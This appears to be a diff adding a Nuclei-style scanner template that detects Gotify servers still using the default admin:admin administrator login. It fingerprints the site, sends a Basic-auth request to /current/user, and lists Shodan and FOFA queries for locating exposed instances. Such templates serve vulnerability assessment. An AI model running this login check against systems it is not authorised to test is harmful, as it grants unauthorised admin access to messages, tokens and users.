@@ -1,0 +1,65 @@
+id: gotify-default-login
+
+info:
+  name: Gotify - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Gotify server creates the administrator account admin with the password admin on first start when no user exists, unless the default user settings are changed. An attacker who logs in with these credentials can read all messages, create applications and clients with new tokens, push notifications to every subscribed device and manage users.
+  reference:
+    - https://gotify.net/docs/install
+    - https://github.com/gotify/server/blob/v3.1.1/config/config.go
+    - https://github.com/gotify/server/blob/v3.1.1/database/database.go
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    vendor: gotify
+    product: server
+    shodan-query: http.title:"Gotify"
+    fofa-query: title="Gotify"
+  tags: gotify,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_any(body, "<title>Gotify", "content=\"Gotify")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /current/user HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains(body, "\"name\":\"admin\"")'
+          - 'contains(body, "\"admin\":true")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
